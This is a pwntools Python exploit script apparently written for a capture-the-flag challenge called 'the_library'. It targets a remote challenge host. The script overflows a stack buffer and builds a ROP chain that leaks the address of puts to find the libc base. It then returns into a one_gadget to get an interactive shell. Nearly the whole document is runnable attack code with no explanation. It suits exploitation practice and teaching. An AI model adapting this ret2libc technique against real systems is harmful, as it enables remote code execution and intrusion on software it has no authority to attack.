#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template the_library_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('the_library_patched') if not args.REMOTE else ELF('the_library')
libc = ELF('./libc.so.6')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR

HOST, PORT = ('challenge.ctf.games', 31125)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x3ff000)
# RUNPATH:  b'.'

# pop_rdi; ret
pop_rdi = 0x0000000000401493

io = start()

gen = cyclic_gen()
payload = gen.get(552)
payload += p64(pop_rdi)
payload += p64(exe.got['puts'])
payload += p64(exe.plt['puts'])
payload += p64(exe.sym.main)

io.sendlineafter(b"> ", payload)

io.recvline()
res = io.recvline().strip().ljust(8, b"\x00")
leak = u64(res)
log.info("Got leak: {}".format(hex(leak)))

libc.address = leak - libc.sym.puts
log.success("Got libc base: {}".format(hex(libc.address)))

io.recvuntil(b"> ")

one_gadgets = [
    0xe6c7e,
    0xe6c81,
    0xe6c84
]
i = 0 if not args.O1 else int(args.O1)
one_gadget = one_gadgets[i]

gen = cyclic_gen()
payload = gen.get(552)
payload += p64(libc.address + one_gadget)

io.sendline(payload)

io.interactive()

